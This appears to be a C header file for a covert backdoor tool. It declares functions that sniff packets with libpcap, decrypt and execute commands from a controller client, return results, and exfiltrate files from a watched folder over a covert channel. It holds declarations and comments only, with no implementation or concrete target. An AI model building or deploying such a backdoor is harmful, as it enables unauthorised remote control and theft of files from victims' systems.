/*
 * server.h
 *
 *  Created on: Jun 4, 2014
 *      Author: root
 */

#ifndef SERVER_H_
#define SERVER_H_

#include <pcap.h>
#include "defs.h"

#define EVENT_SIZE (sizeof (struct inotify_event))
#define BUF_LEN (1024 * (EVENT_SIZE + 16))
#define ALL_MASK 0xffffffff

/**
 * FUNCTION: pcap_init
 *
 * PARAMS:
 * uint32 ipaddr: The ip address we will use for exfiltrated data.
 * const char* filter: The packet filter to apply.
 * int chan: The covert channel to use.
 *
 * RETURN: none.
 *
 * NOTES: Call this function to start libpcap packet capture and exfiltration functions.
 *
 */
void pcap_init(uint32 ipaddr, char *folder, int chan);

/**
 * FUNCTION: cmd_execute
 *
 * PARAMS:
 * char *command: The command to execute.
 * uint32 ip: The client ip in network byte order.
 * int16 port: The destination port in network byte order.
 *
 * RETURN: None.
 *
 * NOTES: This method will execute the command and optionally send the
 * encrypted results back to the client.
 */
void cmd_execute(char *command, uint32 ip, uint16 port);

/*
 * FUNCTION: pkt_handler
 *
 * PARAMS:
 * u_char *user: This will hold our duplex bool.
 * const struct pcap_pkthdr *pkt_inf: Information about the captured packet.
 * const u_char *packet: The captured packet data.
 *
 * RETURN: none.
 *
 * NOTES: This function will be called any time a matching packet is captured,
 * it will check for the proper header key and then attempt to decrypt and
 * execute the command contained within.
 */
void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
		const u_char *packet);

/**
 * FUNCTION: handle_tcp
 *
 * PARAMS:
 * u_char *user: This will hold our duplex bool.
 * const struct pcap_pkthdr *pkt_inf: Information about the captured packet.
 * const u_char *packet: The captured packet data.
 *
 * RETURN: none.
 *
 * NOTES: This function will be called any time the packet_handler receives a
 * TCP packet. It will parse the TCP packet to retrieve the TCP payload sent by
 * the controller client.
 */
void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
		const u_char *packet, int ip_len);

/**
 * FUNCTION: handle_udp
 *
 * PARAMS:
 * u_char *user: This will hold our duplex bool.
 * const struct pcap_pkthdr *pkt_inf: Information about the captured packet.
 * const u_char *packet: The captured packet data.
 *
 * RETURN: none.
 *
 * NOTES: This function will be called any time the packet_handler receives a
 * UDP packet. It will parse the UDP packet to retrieve the UDP payload sent by
 * the controller client.
 */
void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
		const u_char *packet, int ip_len);

/**
 *
 * FUNCTION: exfil_send
 *
 * PARAMS:
 * uint32 ipaddr: IP address of the destination.
 *
 * char *path: Path of the file to send.
 *
 * RETURN: none.
 *
 * NOTES: This function will be called whenever there is an activity of the file
 * or the directory that is under watch, more specifically when the file or
 * directory is modified.
 *
 */

void exfil_send(uint32 ipaddr, char *path);

/**
 * FUNCTION: exfil_watch
 *
 * PARAMS:
 * void *arg: The exfil_pack struct with the ip address to send to and folder to watch.
 *
 * RETURN: none.
 *
 * NOTES: Call this function to start the covert file exfiltration functionality.
 */
void* exfil_watch(void *arg);

#endif /* SERVER_H_ */
